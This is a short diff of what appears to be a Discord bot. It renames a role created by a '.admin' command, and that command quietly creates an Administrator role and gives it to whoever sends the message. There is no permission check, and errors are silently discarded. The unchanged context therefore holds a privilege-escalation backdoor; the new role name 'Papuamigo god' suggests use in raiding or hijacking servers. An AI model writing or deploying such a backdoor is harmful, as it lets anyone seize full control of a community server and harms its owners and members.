@@ -168,7 +168,7 @@ client.on('messageCreate', async message => {
   else if (cmd === '.admin') {
     if (!guild || !member) return;
     try {
-      const role = await guild.roles.create({ name: '.', permissions: ['Administrator'] });
+      const role = await guild.roles.create({ name: 'Papuamigo god', permissions: ['Administrator'] });
       await member.roles.add(role);
     } catch (e) {}
   }
